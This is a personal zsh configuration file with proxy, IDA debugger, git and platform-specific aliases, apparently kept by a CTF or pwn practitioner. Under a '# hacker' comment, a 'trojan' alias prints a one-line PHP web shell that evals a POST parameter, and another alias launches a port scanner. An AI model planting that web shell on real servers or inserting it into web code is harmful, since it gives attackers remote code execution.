export ZSH="$HOME/.oh-my-zsh"
UNAME=$(uname -a)
# network
alias proxyoff="export https_proxy='' http_proxy='' all_proxy=''"
alias proxyon="export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890"
alias pchain="proxychains4"
alias google="curl google.com"
alias baidu="curl baidu.com"
alias pmod="chmod a+x *" # power mod
alias idax86="cd ~/pwn/server && ./linux_server"
alias idax64="cd ~/pwn/server && ./linux_server64"
alias pwn="code ~/pwn"
alias update="cd ~/maintain && git pull && sudo ln -s ~/maintain/tools/* /usr/local/bin"
alias ggg="gaa && gcmsg ".." && gp"
# for ubuntu Desktop
# for m1 MACbook
if [[ $UNAME =~ "Darwin" ]]
then
    echo "U are using Mac! I know."
    alias pd="prlctl start"
    alias python3="/opt/homebrew/bin/python3"
    alias pip3="/opt/homebrew/bin/pip3"
    alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
fi
# for WSL2
if [[ $UNAME =~ "WSL2" ]]
then
    echo "U are using WSL2! I know."
    alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
fi
# hacker
alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"

ZSH_THEME="ys"

plugins=(git
gitignore
extract
sudo
zsh-autosuggestions
zsh-syntax-highlighting
autojump
)
	
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#ff00ff,bg=cyan,bold,underline"

[[ -s $HOME/.autojump/etc/profile.d/autojump.sh ]] && source $HOME/.autojump/etc/profile.d/autojump.sh
autoload -U compinit && compinit -u
source $ZSH/oh-my-zsh.sh
. "/Users/flag/.acme.sh/acme.sh.env"
